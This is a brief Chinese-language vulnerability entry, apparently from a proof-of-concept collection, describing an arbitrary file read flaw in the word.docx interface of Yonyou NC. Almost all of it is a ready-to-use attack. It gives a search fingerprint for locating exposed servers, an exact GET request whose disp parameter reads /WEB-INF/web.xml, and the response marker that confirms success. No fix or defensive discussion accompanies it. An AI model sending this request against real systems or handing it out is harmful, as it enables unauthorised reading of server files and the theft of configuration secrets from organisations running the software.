# 用友NCword.docx接口存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="UClient.dmg"`
- **请求**：`GET /portal/docctr/open/word.docx?disp=/WEB-INF/web.xml HTTP/1.1`
- **响应特征**：200 session-config